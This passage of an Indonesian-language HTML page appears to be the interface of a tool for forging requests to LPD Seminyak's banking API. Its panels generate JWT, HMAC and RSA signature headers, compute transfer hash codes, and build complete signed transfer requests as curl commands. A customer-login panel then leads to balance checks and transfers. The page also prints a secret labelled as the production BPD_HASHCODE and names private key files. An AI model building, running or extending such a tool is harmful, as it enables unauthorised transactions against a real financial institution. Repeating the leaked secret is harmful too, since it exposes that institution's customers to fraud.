      <div>Buat X-CLIENT-ID dari clientID + timestamp. Berguna untuk simulasi request dari perangkat baru.</div>
    </div>
    <div class="grid-2">
      <div class="field-row">
        <label>Client ID</label>
        <input type="text" id="die-clientid" placeholder="AQ3A.240912.001.01102025120205" value="AQ3A.240912.001.01102025120205"/>
      </div>
      <div class="field-row">
        <label>Timestamp (YYYY-MM-DD HH:MM:SS)</label>
        <input type="text" id="die-ts" placeholder="2026-04-21 10:30:00"/>
      </div>
    </div>
    <div class="field-row">
      <label>App Name (default: Seminyak)</label>
      <input type="text" id="die-app" placeholder="Seminyak" value="Seminyak"/>
    </div>
    <div class="btn-group">
      <button class="btn btn-green" onclick="runOp(event,'did-encode')"><i class="fas fa-lock"></i> Encode DID</button>
      <button class="btn btn-secondary" onclick="fillNow('die-ts')"><i class="fas fa-clock"></i> Timestamp Sekarang</button>
    </div>
    <div id="result-did-encode" class="result-box"></div>
  </div>
</div>
</section>

<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<!-- JWT DECODE -->
<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<section id="tab-jwt-decode" class="section">
<div class="panel">
  <div class="panel-header">
    <i class="fas fa-file-code" style="color:#a78bfa"></i>
    <h3>Decode JWT (Authorization header)</h3>
    <span class="badge">JWT RS256</span>
  </div>
  <div class="panel-body">
    <div class="info-box info-purple">
      <i class="fas fa-info-circle"></i>
      <div>Decode JWT Authorization header. Format custom LPD: header berisi <code>trans_no</code> + <code>alg:RS256</code>; payload berisi <code>trans_time</code>. Dibuat oleh lamanuna.biz.id Get_Token.</div>
    </div>
    <div class="field-row">
      <label>JWT Token (Authorization header value)</label>
      <textarea id="jwt-val" style="min-height:100px;font-size:10px" placeholder="eyJ0cmFuc19ubyI6IjExMTIzLTQzNTI0..."></textarea>
    </div>
    <div class="btn-group">
      <button class="btn btn-primary" onclick="runOp(event,'jwt-decode')"><i class="fas fa-code"></i> Decode JWT</button>
      <button class="btn btn-secondary" onclick="fillSampleJWT()"><i class="fas fa-fill"></i> Contoh JWT Real</button>
    </div>
    <div id="result-jwt-decode" class="result-box"></div>
    <div class="divider"></div>
    <div class="quick-ref">
      <span class="comment"># CLI:</span><br>
      <span class="cmd">node lpd-crypto.cjs jwt "&lt;token&gt;"</span>
    </div>
  </div>
</div>
</section>

<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<!-- SIG DECODE -->
<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<section id="tab-sig-decode" class="section">
<div class="panel">
  <div class="panel-header">
    <i class="fas fa-signature" style="color:#a78bfa"></i>
    <h3>Decode X-SIGNATURE / X-PARTNER-ID</h3>
    <span class="badge">base64 \u2192 hex</span>
  </div>
  <div class="panel-body">
    <div class="info-box info-purple">
      <i class="fas fa-info-circle"></i>
      <div>Decode X-SIGNATURE atau X-PARTNER-ID dari base64 ke hex. Keduanya menggunakan formula yang sama: <code>base64(HMAC-SHA512(token:timestamp, aes_cs))</code>.</div>
    </div>
    <div class="field-row">
      <label>X-SIGNATURE atau X-PARTNER-ID (base64)</label>
      <textarea id="sigd-val" placeholder="N2E2Y2VhNGNlZDgyYWQ3NT..."></textarea>
    </div>
    <button class="btn btn-primary" onclick="runOp(event,'sig-decode')"><i class="fas fa-search"></i> Decode Signature</button>
    <div id="result-sig-decode" class="result-box"></div>
    <div class="divider"></div>
    <div class="quick-ref">
      <span class="comment"># CLI:</span><br>
      <span class="cmd">node lpd-crypto.cjs sig "&lt;base64_signature&gt;"</span>
    </div>
  </div>
</div>
</section>

<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<!-- SIGNATURE -->
<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<section id="tab-signature" class="section">
<div class="panel">
  <div class="panel-header">
    <i class="fas fa-pen-nib" style="color:#a78bfa"></i>
    <h3>Generate X-SIGNATURE &amp; X-PARTNER-ID</h3>
    <span class="badge">HMAC-SHA512</span>
  </div>
  <div class="panel-body">
    <div class="info-box info-purple">
      <i class="fas fa-info-circle"></i>
      <div>Generate X-SIGNATURE dan X-PARTNER-ID. Formula: <code>base64(HMAC-SHA512(token + ":" + timestamp, aes_cs))</code>. Keduanya menghasilkan nilai yang SAMA jika menggunakan aes_cs yang sama.</div>
    </div>
    <div class="field-row">
      <label>Authorization Token (JWT)</label>
      <textarea id="sig-token" style="min-height:80px;font-size:10px" placeholder="eyJ0cmFuc19ubyI6..."></textarea>
    </div>
    <div class="grid-2">
      <div class="field-row">
        <label>X-TIMESTAMP (YYYY-MM-DD HH:MM:SS)</label>
        <input type="text" id="sig-ts" placeholder="2026-04-20 11:44:20"/>
      </div>
      <div class="field-row">
        <label>AES CS (base64, 8 bytes)</label>
        <input type="text" id="sig-cs" placeholder="1O7pFHEDJ0k="/>
      </div>
    </div>
    <div class="btn-group">
      <button class="btn btn-primary" onclick="runOp(event,'signature')"><i class="fas fa-pen"></i> Generate Signature</button>
      <button class="btn btn-secondary" onclick="pasteFromKeygenCS('sig-cs');fillNow('sig-ts')"><i class="fas fa-paste"></i> Paste dari Keygen</button>
    </div>
    <div id="result-signature" class="result-box"></div>
    <div class="divider"></div>
    <div class="quick-ref">
      <span class="comment"># Formula:</span><br>
      <span class="cmd">base64( HMAC-SHA512( token + ":" + timestamp, aes_cs ) )</span>
    </div>
  </div>
</div>
</section>

<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<!-- iOS TOKEN SIG -->
<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<section id="tab-ios-token-sig" class="section">
<div class="panel">
  <div class="panel-header">
    <i class="fas fa-mobile-alt" style="color:#a78bfa"></i>
    <h3>iOS Token Signature (iosTokenCtrl)</h3>
    <span class="badge">RSA-SHA256</span>
  </div>
  <div class="panel-body">
    <div class="info-box info-green">
      <i class="fas fa-info-circle"></i>
      <div>Generate X-SIGNATURE untuk endpoint <code>POST /api/smart/access/token</code>. Formula: <code>RSA-SHA256(SHA256("Seminyak|" + timestamp))</code> menggunakan <b>private_key_lpd.pem</b>.</div>
    </div>
    <div class="field-row">
      <label>Timestamp (YYYY-MM-DD HH:MM:SS) \u2014 kosongkan untuk otomatis</label>
      <input type="text" id="ios-ts" placeholder="Kosongkan untuk timestamp sekarang (Jakarta)"/>
    </div>
    <div class="btn-group">
      <button class="btn btn-primary" onclick="runOp(event,'ios-token-sig')"><i class="fas fa-mobile-alt"></i> Generate iOS Sig</button>
      <button class="btn btn-secondary" onclick="fillNow('ios-ts')"><i class="fas fa-clock"></i> Timestamp Sekarang</button>
    </div>
    <div id="result-ios-token-sig" class="result-box"></div>
    <div class="divider"></div>
    <div class="quick-ref">
      <span class="comment"># Formula PHP (iosTokenCtrl.php):</span><br>
      <span class="cmd">$clientStamp = hash("sha256", "Seminyak|" . $timeStamp);</span><br>
      <span class="cmd">openssl_sign($clientStamp, $sig, $privateKey);</span><br>
      <span class="cmd">base64_encode($sig);</span>
    </div>
  </div>
</div>
</section>

<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<!-- SNAP TOKEN SIG -->
<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<section id="tab-snap-token-sig" class="section">
<div class="panel">
  <div class="panel-header">
    <i class="fas fa-plug" style="color:#a78bfa"></i>
    <h3>SNAP Token Signature (BPD)</h3>
    <span class="badge">RSA-SHA256</span>
  </div>
  <div class="panel-body">
    <div class="info-box info-purple">
      <i class="fas fa-info-circle"></i>
      <div>Generate X-SIGNATURE untuk endpoint <code>POST /api/v1.0/access-token/b2b</code>. Formula: <code>RSA-SHA256(clientKey + "|" + timestamp)</code> menggunakan <b>private_bpd_003.pem</b>.</div>
    </div>
    <div class="grid-2">
      <div class="field-row">
        <label>X-CLIENT-KEY</label>
        <input type="text" id="snap-key" placeholder="LPD-SEMINYAK-001" value="LPD-SEMINYAK-001"/>
      </div>
      <div class="field-row">
        <label>Timestamp ISO8601 \u2014 kosongkan untuk otomatis</label>
        <input type="text" id="snap-ts" placeholder="2026-04-21T10:30:00+07:00"/>
      </div>
    </div>
    <div class="btn-group">
      <button class="btn btn-primary" onclick="runOp(event,'snap-token-sig')"><i class="fas fa-plug"></i> Generate SNAP Sig</button>
      <button class="btn btn-secondary" onclick="fillNowISO('snap-ts')"><i class="fas fa-clock"></i> Timestamp Sekarang</button>
    </div>
    <div id="result-snap-token-sig" class="result-box"></div>
    <div class="divider"></div>
    <div class="quick-ref">
      <span class="comment"># Formula SNAP BPD:</span><br>
      <span class="cmd">message = clientKey + "|" + timestamp</span><br>
      <span class="cmd">RSA-SHA256(message, private_bpd_003.pem)</span><br>
      <span class="cmd">base64_encode(signature)</span>
    </div>
  </div>
</div>
</section>

<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<!-- HASHCODE -->
<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<section id="tab-hashcode" class="section">
<div class="panel">
  <div class="panel-header">
    <i class="fas fa-fingerprint" style="color:#a78bfa"></i>
    <h3>Hash Code Transfer</h3>
    <span class="badge">SHA-256</span>
  </div>
  <div class="panel-body">
    <div class="tab-bar">
      <div class="tab active" onclick="switchSubTab(this,'hash','check')">Check/Inquiry</div>
      <div class="tab" onclick="switchSubTab(this,'hash','posting')">Posting</div>
      <div class="tab" onclick="switchSubTab(this,'hash','lpd')">LPD Internal</div>
    </div>
    <div id="hash-check" class="tab-panel active">
      <div class="info-box info-purple">
        <i class="fas fa-info-circle"></i>
        <div>Formula Check/Inquiry: <code>SHA256("%"+fromAcc+"#"+amount+"@"+dateTime+"^"+refNo+"*"+destBank+"~"+destAcc+"|"+BPD_HASHCODE+"%")</code></div>
      </div>
    </div>
    <div id="hash-posting" class="tab-panel">
      <div class="info-box info-yellow">
        <i class="fas fa-info-circle"></i>
        <div>Formula Posting: <code>SHA256("@"+fromAcc+"|"+amount+"~"+dateTime+"*"+refNo+"^"+destBank+"#"+destAcc+"("+destName+")"+BPD_HASHCODE+"@")</code></div>
      </div>
    </div>
    <div id="hash-lpd" class="tab-panel">
      <div class="info-box info-green">
        <i class="fas fa-info-circle"></i>
        <div>Formula LPD Internal: <code>SHA256("{"+nominal+"*"+norekFrom+"^"+norekTo+"%"+nameFrom+"#"+nameTo+"@"+BPD_HASHCODE+"}")</code></div>
      </div>
    </div>
    <input type="hidden" id="hash-step" value="check"/>

    <div id="hash-fields-transfer">
      <div class="grid-2">
        <div class="field-row">
          <label>From Account (Rek. Asal)</label>
          <input type="text" id="hc-from" placeholder="1234567890"/>
        </div>
        <div class="field-row">
          <label>Amount (Nominal)</label>
          <input type="text" id="hc-amount" placeholder="500000"/>
        </div>
        <div class="field-row">
          <label>Date Time (YYYY-MM-DD HH:MM:SS)</label>
          <input type="text" id="hc-dt" placeholder="2026-04-20 11:44:20"/>
        </div>
        <div class="field-row">
          <label>Reference No (X-REFERENCE)</label>
          <input type="text" id="hc-ref" placeholder="SMY0444582O10120422"/>
        </div>
        <div class="field-row">
          <label>Dest Bank Code</label>
          <input type="text" id="hc-bank" placeholder="014"/>
        </div>
        <div class="field-row">
          <label>Dest Account</label>
          <input type="text" id="hc-acc" placeholder="0987654321"/>
        </div>
      </div>
      <div class="field-row" id="hash-field-destname">
        <label>Dest Name (Nama Penerima) \u2014 diperlukan untuk Posting</label>
        <input type="text" id="hc-name" placeholder="I MADE BUDI SANTOSA"/>
      </div>
    </div>

    <div id="hash-fields-lpd" style="display:none">
      <div class="grid-2">
        <div class="field-row">
          <label>Nominal</label>
          <input type="text" id="hc-nominal" placeholder="500000"/>
        </div>
        <div class="field-row">
          <label>Norek From</label>
          <input type="text" id="hc-nfrom" placeholder="1234567890"/>
        </div>
        <div class="field-row">
          <label>Norek To</label>
          <input type="text" id="hc-nto" placeholder="0987654321"/>
        </div>
        <div class="field-row">
          <label>Name From</label>
          <input type="text" id="hc-nfromname" placeholder="I WAYAN SARI"/>
        </div>
      </div>
      <div class="field-row">
        <label>Name To</label>
        <input type="text" id="hc-ntoname" placeholder="I MADE BUDI"/>
      </div>
    </div>

    <button class="btn btn-primary" onclick="runOp(event,'hashcode')"><i class="fas fa-fingerprint"></i> Generate Hash Code</button>
    <div id="result-hashcode" class="result-box"></div>
    <div class="divider"></div>
    <div class="info-box info-yellow">
      <i class="fas fa-lock"></i>
      <div>BPD_HASHCODE = <b>p91wrswK</b> (dari .env production). Hash code ini kemudian di-encrypt dengan AES sebelum dikirim di body request.</div>
    </div>
    <div class="quick-ref">
      <span class="comment"># CLI:</span><br>
      <span class="cmd">node lpd-crypto.cjs hashcode &lt;fromAcc&gt; &lt;amount&gt; &lt;dateTime&gt; &lt;refNo&gt; &lt;destBank&gt; &lt;destAcc&gt; &lt;destName&gt;</span>
    </div>
  </div>
</div>
</section>

<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<!-- BUILD TRANSFER REQUEST -->
<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<section id="tab-build-transfer" class="section">
<div class="panel">
  <div class="panel-header">
    <i class="fas fa-hammer" style="color:#a78bfa"></i>
    <h3>Build Transfer Bank Request (Lengkap)</h3>
    <span class="badge">Full Builder</span>
  </div>
  <div class="panel-body">
    <div class="info-box info-purple">
      <i class="fas fa-info-circle"></i>
      <div>Build request lengkap untuk <code>/api/smart/transfer/bank/check</code> atau <code>/post</code> atau <code>/inquiry</code>. Menghasilkan semua header + body terenkripsi + curl command siap pakai.</div>
    </div>

    <div class="tab-bar">
      <div class="tab active" onclick="switchSubTab(this,'bt','check')">Check</div>
      <div class="tab" onclick="switchSubTab(this,'bt','inquiry')">Inquiry</div>
      <div class="tab" onclick="switchSubTab(this,'bt','posting')">Posting</div>
    </div>
    <input type="hidden" id="bt-step" value="check"/>

    <div class="grid-2">
      <div class="field-row">
        <label>Base URL</label>
        <input type="text" id="bt-url" value="https://lpdseminyak.biz.id:8000"/>
      </div>
      <div class="field-row">
        <label>Authorization (JWT Token)</label>
        <input type="text" id="bt-token" placeholder="eyJ0cmFuc19ubyI6..."/>
      </div>
      <div class="field-row">
        <label>X-CLIENT-ID (encoded DID)</label>
        <input type="text" id="bt-did" placeholder="U01ZU2V6F3B7B..."/>
      </div>
      <div class="field-row">
        <label>AES Key (base64)</label>
        <input type="text" id="bt-key" placeholder="6mFbbiR/..."/>
      </div>
      <div class="field-row">
        <label>AES IV (base64)</label>
        <input type="text" id="bt-iv" placeholder="ZLrWcBiR..."/>
      </div>
      <div class="field-row">
        <label>AES CS (base64, untuk X-SIGNATURE)</label>
        <input type="text" id="bt-cs" placeholder="1O7pFHEDJ0k="/>
      </div>
      <div class="field-row">
        <label>From Account</label>
        <input type="text" id="bt-from" placeholder="1234567890"/>
      </div>
      <div class="field-row">
        <label>Amount</label>
        <input type="text" id="bt-amount" placeholder="500000"/>
      </div>
      <div class="field-row">
        <label>Dest Bank Code</label>
        <input type="text" id="bt-dbank" placeholder="014"/>
      </div>
      <div class="field-row">
        <label>Dest Account</label>
        <input type="text" id="bt-dacc" placeholder="0987654321"/>
      </div>
      <div class="field-row">
        <label>Dest Name</label>
        <input type="text" id="bt-dname" placeholder="I MADE BUDI SANTOSA"/>
      </div>
      <div class="field-row">
        <label>Date Time (kosong = otomatis)</label>
        <input type="text" id="bt-dt" placeholder="Otomatis timestamp Jakarta"/>
      </div>
    </div>
    <div class="field-row">
      <label>X-REFERENCE (kosong = generate otomatis)</label>
      <input type="text" id="bt-ref" placeholder="Generate otomatis (SMY...)"/>
    </div>

    <div class="btn-group">
      <button class="btn btn-primary" onclick="runOp(event,'build-transfer')"><i class="fas fa-hammer"></i> Build Request</button>
      <button class="btn btn-secondary" onclick="pasteFromKeygen('bt-key','bt-iv');pasteFromKeygenCS('bt-cs')"><i class="fas fa-paste"></i> Paste dari Keygen</button>
    </div>
    <div id="result-build-transfer" class="result-box"></div>
  </div>
</div>
</section>

<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<!-- SMART: LOGIN NASABAH -->
<!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
<section id="tab-smart-login" class="section">

<!-- Session status bar (ditampilkan di semua smart tabs) -->
<div id="smart-session-bar" style="display:none" class="content" style="padding-bottom:0">
<div class="session-box">
  <div class="session-title"><span class="badge-live"><span class="dot"></span>Sesi Aktif</span> &nbsp; Nasabah Login</div>
  <div class="session-field"><span class="sf-label">Status</span><span class="sf-val" id="ss-token-preview">\u2014</span><button class="sf-copy" onclick="copyRaw(document.getElementById('ss-token-full').value)" title="Salin X-CLIENT-ID">Salin DID</button><input type="hidden" id="ss-token-full"/></div>
  <div class="session-field"><span class="sf-label">AES Key</span><span class="sf-val" id="ss-key">\u2014</span><button class="sf-copy" onclick="copyRaw(this.previousElementSibling.textContent)">Salin</button></div>
  <div class="session-field"><span class="sf-label">AES IV</span><span class="sf-val" id="ss-iv">\u2014</span><button class="sf-copy" onclick="copyRaw(this.previousElementSibling.textContent)">Salin</button></div>
  <div class="session-field"><span class="sf-label">AES CS</span><span class="sf-val" id="ss-cs">\u2014</span><button class="sf-copy" onclick="copyRaw(this.previousElementSibling.textContent)">Salin</button></div>
  <div class="session-field"><span class="sf-label">X-CLIENT-ID</span><span class="sf-val" id="ss-did">\u2014</span><button class="sf-copy" onclick="copyRaw(this.previousElementSibling.textContent)">Salin</button></div>
  <div style="margin-top:8px;display:flex;gap:8px;flex-wrap:wrap">
    <button class="btn btn-red" style="font-size:10px;padding:5px 12px" onclick="smartLogout()"><i class="fas fa-sign-out-alt"></i> Logout</button>
    <button class="btn btn-secondary" style="font-size:10px;padding:5px 12px" onclick="showTab('smart-saldo')"><i class="fas fa-wallet"></i> Cek Saldo</button>
    <button class="btn btn-secondary" style="font-size:10px;padding:5px 12px" onclick="showTab('smart-transfer')"><i class="fas fa-exchange-alt"></i> Transfer</button>
  </div>
</div>
</div>

<div class="content">
<div class="panel">
  <div class="panel-header">
    <i class="fas fa-sign-in-alt" style="color:#fbbf24"></i>
    <h3>Login Nasabah</h3>
    <span class="badge" style="background:#1c1200;color:#fbbf24">POST /api/smart/access/login</span>
  </div>
  <div class="panel-body">

    <div class="info-box info-yellow">
      <i class="fas fa-info-circle"></i>
      <div>Login mengirim <code>MD5(user_name)</code> &amp; <code>MD5(user_pass)</code> sebagai body. Header <b>Authorization</b> (JWT), <b>X-SIGNATURE</b>, <b>X-PARTNER-ID</b>, <b>X-CLIENT-ID</b> dibuat otomatis dari AES CS + private key LPD. Setelah berhasil, sesi aktif untuk Cek Saldo &amp; Transfer.</div>
    </div>

    <!-- Step indicator -->
    <div class="step-indicator">
      <div class="step" id="sl-step1"><i class="fas fa-key"></i> 1. Derive Keys</div>
      <span class="step-arrow">\u203A</span>
      <div class="step" id="sl-step2"><i class="fas fa-user"></i> 2. Isi Kredensial</div>
      <span class="step-arrow">\u203A</span>
      <div class="step" id="sl-step3"><i class="fas fa-sign-in-alt"></i> 3. Login</div>
      <span class="step-arrow">\u203A</span>
      <div class="step" id="sl-step4"><i class="fas fa-check"></i> 4. Status 00</div>
    </div>

    <!-- Auto-fill status banner -->
    <div id="sl-autofill-banner" style="display:none;background:#0a1a0a;border:1px solid #22c55e44;border-radius:8px;padding:10px 14px;margin-bottom:12px;display:flex;align-items:center;gap:10px">
      <span style="color:#22c55e;font-size:18px"><i class="fas fa-magic"></i></span>
      <div style="flex:1">
        <div style="color:#4ade80;font-size:12px;font-weight:700">Kunci & X-CLIENT-ID Terisi Otomatis!</div>
        <div style="color:#6b7280;font-size:10px" id="sl-autofill-info">AES Key/IV/CS + X-CLIENT-ID dari Derive Keys tadi.</div>
      </div>
      <button class="btn btn-secondary" style="font-size:10px;padding:4px 10px" onclick="slPasteKeygen()"><i class="fas fa-sync"></i> Refresh</button>
    </div>
    <div id="sl-no-keygen-banner" style="background:#1a0a00;border:1px solid #d9770644;border-radius:8px;padding:10px 14px;margin-bottom:12px;display:flex;align-items:center;gap:10px">
      <span style="color:#f59e0b;font-size:18px"><i class="fas fa-exclamation-triangle"></i></span>
      <div style="flex:1">
        <div style="color:#fbbf24;font-size:12px;font-weight:700">Belum ada data Keygen</div>
        <div style="color:#6b7280;font-size:10px">Jalankan <b>Derive AES Keys</b> terlebih dahulu \u2014 X-CLIENT-ID akan otomatis terisi.</div>
      </div>
      <button class="btn btn-secondary" style="font-size:10px;padding:4px 10px" onclick="showTab('keygen')"><i class="fas fa-key"></i> Ke Keygen</button>
    </div>

    <!-- AES Keys (dari Keygen \u2014 diisi otomatis) -->
    <h4 style="font-size:12px;font-weight:700;color:#fbbf24;margin-bottom:10px"><i class="fas fa-key"></i> Kunci AES & X-CLIENT-ID <span id="sl-keys-badge" style="display:none;background:#14532d;color:#4ade80;font-size:9px;padding:2px 7px;border-radius:8px;font-weight:700;margin-left:6px">\u2705 AUTO</span></h4>
    <div class="grid-2">
      <div class="field-row">
        <label>AES Key (base64, 32 bytes)</label>
        <input type="text" id="sl-key" placeholder="Otomatis dari Derive AES Keys" readonly style="background:#111;color:#a78bfa"/>
      </div>
      <div class="field-row">
        <label>AES IV (base64, 16 bytes)</label>
        <input type="text" id="sl-iv" placeholder="Otomatis dari Derive AES Keys" readonly style="background:#111;color:#a78bfa"/>
      </div>
    </div>
    <div class="grid-2">
      <div class="field-row">
        <label>AES CS (base64, 8 bytes)</label>
        <input type="text" id="sl-cs" placeholder="Otomatis dari Derive AES Keys" readonly style="background:#111;color:#a78bfa"/>
      </div>
      <div class="field-row">
        <label>X-CLIENT-ID (encoded) <span style="color:#22c55e;font-size:9px">\u26A1 Auto</span></label>
        <input type="text" id="sl-did" placeholder="Otomatis dari Derive AES Keys" readonly style="background:#111;color:#22c55e"/>
      </div>
    </div>
    <div class="divider"></div>

    <!-- Kredensial -->
    <h4 style="font-size:12px;font-weight:700;color:#fbbf24;margin-bottom:10px"><i class="fas fa-user-lock"></i> Kredensial Nasabah</h4>
    <div class="grid-2">
      <div class="field-row">
        <label>Username (plaintext / MD5)</label>
        <input type="text" id="sl-user" placeholder="c70225c9408df9a1ebacc16870f6e7d1"/>
      </div>
      <div class="field-row">
        <label>Password (plaintext / MD5)</label>
        <input type="password" id="sl-pass" placeholder="2b481940af1d3458913abd25b114745c"/>
      </div>
    </div>
    <div class="field-row">
      <label>Base URL Server</label>
      <input type="text" id="sl-url" value="https://lpdseminyak.biz.id:8000"/>
    </div>

    <div class="btn-group">
      <button class="btn btn-primary" style="background:linear-gradient(135deg,#d97706,#b45309)" id="sl-btn" onclick="smartLogin(this)"><i class="fas fa-sign-in-alt"></i> Login Sekarang</button>
